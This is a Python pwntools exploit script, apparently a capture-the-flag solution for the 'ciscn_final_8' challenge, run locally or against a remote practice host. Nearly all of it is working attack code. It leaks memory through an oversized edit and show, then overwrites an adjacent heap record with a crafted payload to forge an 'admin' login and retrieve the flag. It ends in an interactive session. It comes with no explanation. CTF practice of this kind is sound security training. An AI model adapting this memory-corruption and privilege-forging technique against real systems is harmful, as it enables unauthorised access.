import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ciscn_final_8')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ciscn_final_8')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
		else :
			io=remote('node3.buuoj.cn',25869)
			elf=ELF('./ciscn_final_8')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')

		def add(a,b,c,d):
			io.sendlineafter('Choice> ','1')
			io.sendlineafter('please set your age:',str(12))
			io.sendlineafter('first, length of passwd?\n',str(a))
			io.sendafter('ok, input your passwd\n',b)
			io.sendlineafter('first, length of text?\n',str(c))
			io.sendafter('ok, input your text\n',d)

		def login(a,b,c):
			io.sendlineafter('Choice> ','2')
			io.sendlineafter('first, input your id\n',str(a))
			io.sendlineafter('length of passwd?\n',str(b))
			io.sendafter('ok, input your passwd\n',c)

		def edit(a,b):
			io.sendlineafter('Choice> ','3')
			io.sendlineafter('first, length of text?\n',str(a))
			io.sendafter('ok, input your text\n',b)

		def show():
			io.sendlineafter('Choice> ','1')

		def login_out():
			io.sendlineafter('Choice> ','4')

		def flag():
			io.sendlineafter('Choice> ','2')

		add(0x20,'a'*0x20,0x20,'b'*0x20)
		add(0x20,'a'*0x20,0x20,'b'*0x20)
		login(0,0x20,'a'*0x20)
		edit(0x70,'a'*0x70)
		show()
		io.recv(0x5)
		io.recv(0x8b)
		data=io.recv(0x20)
		pay='b'*0x40+p32(0)+p64(0x91)+p32(1)+p32(0xc)+p32(0x20)+'user1'
		pay=pay.ljust(0x70,'\x00')
		edit(0x70,pay)
		login_out()
		pay=p32(1)+p32(0xc)+p32(0x20)+'admin\x31'
		pay=pay.ljust(0x24,'\x00')
		pay+=data
		pay+='b'*0x20
		add(0x64,pay,0x20,'b'*0x20)
		login(1,0x20,'a'*0x20)
		edit(0x70,'a'*0x70)
		show()
		io.recv(5)
		io.recv(0x8b)
		data1=io.recv(0x20)
		login_out()
		login(0,0x20,'a'*0x20)
		pay='b'*0x40+p32(0)+p64(0x91)+p32(1)+p32(0xc)+p32(0x20)+'admin\x31'
		pay=pay.ljust(0x70,'\x00')
		pay+=data
		pay+='b'*0x20
		pay+=data1
		pay+='\x00'*4
		edit(len(pay),pay)
		login_out()
		# gdb.attach(io)
		login(1,0x20,'a'*0x20)
		flag()
		#pause()


		
		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# success('libc_base:'+hex(libc_base))
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue